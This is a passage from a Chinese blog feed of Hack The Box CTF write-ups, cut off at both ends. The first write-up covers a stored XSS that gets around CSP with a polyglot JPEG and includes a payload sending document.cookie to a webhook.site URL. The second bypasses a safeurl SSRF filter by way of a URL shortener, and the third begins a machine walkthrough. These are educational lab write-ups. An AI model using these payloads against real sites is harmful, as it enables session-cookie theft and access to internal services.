= await browser.newPage();</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/&#x27;);</span><br><span class=\"line\">\tawait page.setCookie(...cookies);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/review&#x27;, &#123;</span><br><span class=\"line\">\t\twaitUntil: &#x27;networkidle2&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait browser.close();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = &#123; purgeData &#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这里存在了 flag 放进了 cookies</p>\n<p>routes/index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs             = require(&#x27;fs&#x27;);</span><br><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br><span class=\"line\">const path           = require(&#x27;path&#x27;);</span><br><span class=\"line\">const express        = require(&#x27;express&#x27;);</span><br><span class=\"line\">const router         = express.Router();</span><br><span class=\"line\">const JWTHelper      = require(&#x27;../helpers/JWTHelper&#x27;);</span><br><span class=\"line\">const UploadHelper   = require(&#x27;../helpers/UploadHelper&#x27;)</span><br><span class=\"line\">const AuthMiddleware = require(&#x27;../middleware/AuthMiddleware&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">let db;</span><br><span class=\"line\"></span><br><span class=\"line\">const response = data =&gt; (&#123; message: data &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.render(&#x27;index.html&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/register&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.checkUser(username)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tif (user) return res.status(401).send(response(&#x27;User already registered!&#x27;));</span><br><span class=\"line\">\t\t\t\treturn db.registerUser(username, password)</span><br><span class=\"line\">\t\t\t\t\t.then(()  =&gt; res.send(response(&#x27;User registered successfully!&#x27;)))</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(401).send(response(&#x27;Please fill out all the required fields!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/login&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.loginUser(username, password)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tlet token = JWTHelper.sign(&#123; username: user.username &#125;);</span><br><span class=\"line\">\t\t\t\tres.cookie(&#x27;session&#x27;, token, &#123; maxAge: 3600000 &#125;);</span><br><span class=\"line\">\t\t\t\treturn res.send(response(&#x27;User authenticated successfully!&#x27;));</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.status(403).send(response(&#x27;Invalid username or password!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(500).send(response(&#x27;Missing parameters!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/feed&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\treturn db.getPosts()</span><br><span class=\"line\">\t\t\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\tres.render(&#x27;feed.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/profile&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tres.render(&#x27;profile.html&#x27;, &#123; user &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/review&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\tif(req.ip != &#x27;127.0.0.1&#x27;) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn db.getPosts(0)</span><br><span class=\"line\">\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\tres.render(&#x27;review.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/submit&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;); </span><br><span class=\"line\">\t\t\tconst &#123; content &#125; = req.body;</span><br><span class=\"line\">\t\t\tif(content)&#123;</span><br><span class=\"line\">\t\t\t\ttwoDots = content.match(/\\./g);</span><br><span class=\"line\">\t\t\t\tif(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\t\t\t\t\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\treturn db.addPost(user.username, content)</span><br><span class=\"line\">\t\t\t\t\t.then(() =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\tbot.purgeData(db);</span><br><span class=\"line\">\t\t\t\t\t\tres.send(response(&#x27;Your submission is awaiting approval by Admin!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t&#125;);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\treturn res.status(403).send(response(&#x27;Please write your story first!&#x27;));</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/upload&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tif (!req.files) return res.status(400).send(response(&#x27;No files were uploaded.&#x27;));</span><br><span class=\"line\">\t\t\treturn UploadHelper.uploadImage(req.files.avatarFile)</span><br><span class=\"line\">\t\t\t\t.then(filename =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\treturn db.updateAvatar(user.username,filename)</span><br><span class=\"line\">\t\t\t\t\t\t.then(()  =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\tres.send(response(&#x27;Image uploaded successfully!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t\t\tif(user.avatar != &#x27;default.jpg&#x27;) </span><br><span class=\"line\">\t\t\t\t\t\t\t\tfs.unlinkSync(path.join(__dirname, &#x27;/../uploads&#x27;,user.avatar)); // remove old avatar</span><br><span class=\"line\">\t\t\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(err =&gt; res.status(500).send(response(err.message)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.status(404).send(response(&#x27;user does not exist!&#x27;));</span><br><span class=\"line\">\t\t\tavatar = path.join(__dirname, &#x27;/../uploads&#x27;, user.avatar);</span><br><span class=\"line\">\t\t\treturn res.sendFile(avatar);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/logout&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\tres.clearCookie(&#x27;session&#x27;);</span><br><span class=\"line\">\treturn res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = database =&gt; &#123; </span><br><span class=\"line\">\tdb = database;</span><br><span class=\"line\">\treturn router;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这个是记录路由的地方</p>\n<p>并且上面还引用了我们需要的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>在代码 93 行调用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bot.purgeData(db);</span><br></pre></td></tr></table></figure></p>\n<p>现在我们就是要利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return </span><br></pre></td></tr></table></figure></p>\n<p>加上前端代码的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">                        &lt;p&gt;&#123;&#123; post.content|safe &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p>来达到获取 cookie 但是因为这个 blog 利用了 csp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>要求你必须要写两个段落也就是两个点</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;/api/avatar/test&quot;&gt;&lt;/script&gt;1.1.</span><br></pre></td></tr></table></figure></p>\n<p>写成这样就可以了</p>\n<p>在利用 upload 来上传我们需要的 payload</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs</span><br></pre></td></tr></table></figure></p>\n<p>这里接收 cookie 的用的是 webhook</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/=document.location.href=&quot;https://webhook.site/72ad2f9e-7a81-4b01-d3ed-8290387f7d0b?&quot;+document.cookie;/*</span><br></pre></td></tr></table></figure></p>\n<p>内容加进图片并且要不小于 120x120</p>\n<p>这里我使用的软件是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">img_polygloter.py</span><br></pre></td></tr></table></figure></p>\n<p>然后不知道为什么我就得不到 cookie</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Saturn/",
            "url": "https://lookhui.github.io/HTB-Saturn/",
            "title": "HTB-Saturn",
            "date_published": "2023-12-15T09:04:13.000Z",
            "content_html": "<h1 id=\"saturn\"><a class=\"anchor\" href=\"#saturn\">#</a> Saturn</h1>\n<p>白盒测试</p>\n<p>首先进入网站下载题目</p>\n<p>查看到了源码使用 python 进行搭建</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    app.run(host=&quot;0.0.0.0&quot;, port=1337, threaded=True)</span><br></pre></td></tr></table></figure></p>\n<p>一开始我看这个题目觉得很离谱，一直在传参发现没有作用</p>\n<p>先来解释一遍这个代码的过程吧</p>\n<ol>\n<li>\n<p>调用了这三个包，真的非常的强大的几个包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br></pre></td></tr></table></figure></p>\n<p>了解一下这个包，他是用来效验你的 url 是否为他想要的那几个</p>\n<p>源码过滤如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self._lists = &#123;</span><br><span class=\"line\">        &quot;whitelist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [],</span><br><span class=\"line\">            &quot;port&quot;: [&quot;80&quot;, &quot;443&quot;, &quot;8080&quot;],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: [&quot;http&quot;, &quot;https&quot;]&#125;,</span><br><span class=\"line\">        &quot;blacklist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [&quot;0.0.0.0/8&quot;, &quot;10.0.0.0/8&quot;, &quot;100.64.0.0/10&quot;, &quot;127.0.0.0/8&quot;, &quot;169.254.0.0/16&quot;,</span><br><span class=\"line\">                &quot;172.16.0.0/12&quot;, &quot;192.0.0.0/29&quot;, &quot;192.0.2.0/24&quot;, &quot;192.88.99.0/24&quot;, &quot;192.168.0.0/16&quot;,</span><br><span class=\"line\">                &quot;198.18.0.0/15&quot;, &quot;198.51.100.0/24&quot;, &quot;203.0.113.0/24&quot;, &quot;224.0.0.0/4&quot;, &quot;240.0.0.0/4&quot;],</span><br><span class=\"line\">            &quot;port&quot;: [],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: []&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>然后就是一个函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这个函数就是让你输入一个 url 并且必须要你的 url 不是本地 url 使用了上面说的 safeurl 进行了效验</p>\n</li>\n<li>\n<p>第三段</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br></pre></td></tr></table></figure></p>\n<p>这个代码只要你的 requests.remote_addr 是 127.0.0.1 就能得到 flag</p>\n<p>但是这个 remote_addr 和 xff 那种不太一样不好进行伪造</p>\n</li>\n<li>\n<p>总结</p>\n<p>我们现在可以通过第一个路由 index 来去访问这个 secret 来构成伪造，要么就自己伪造这个 127.0.0.1</p>\n<p>我经过了很久搜索发现这个伪造没有我想的这么简单</p>\n<p>并且在其他网站上还有说这个 remote_addr 根本不可能伪造</p>\n</li>\n</ol>\n<h4 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h4>\n<p>经过多次搜索在不屑的努力下，搜到了一个网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shorturl.at/shortener.php</span><br></pre></td></tr></table></figure></p>\n<p>这个网站可以将你的 url 缩短并且使用他的 url 和使用自己的效果一样</p>\n<p>把</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:1337/secret</span><br></pre></td></tr></table></figure></p>\n<p>输入进入后能发现变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://shorturl.at/abENS</span><br></pre></td></tr></table></figure></p>\n<p>然后输入到 index 的框里面</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Zipping/",
            "url": "https://lookhui.github.io/HTB-Zipping/",
            "title": "HTB-Zipping",
            "date_published": "2023-12-15T03:29:22.000Z",
            "content_html": "<h1 id=\"zipping\"><a class=\"anchor\" href=\"#zipping\">#</a> Zipping</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>开启靶机后得到靶机 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">靶机:10.129.48.105</span><br><span class=\"line\">自己:10.10.14.22</span><br></pre></td></tr></table></figure></p>\n<p>首先使用 nmap 来进行扫描</p>\n<p>同时使用浏览器默认访问</p>\n<p>发现和常规的不同不需要使用域名也就是不需要更换 hosts</p>\n<p>使用 f12 打开检查点击 network 查看响应器 (目的是查看是否有可利用的 api)</p>\n<p>发现并没有我们想要的</p>\n<p>使用 wfuzz 进行模糊测试查看目录</p>\n<p>同时 nmap 扫描信息出来</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 11:31 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon 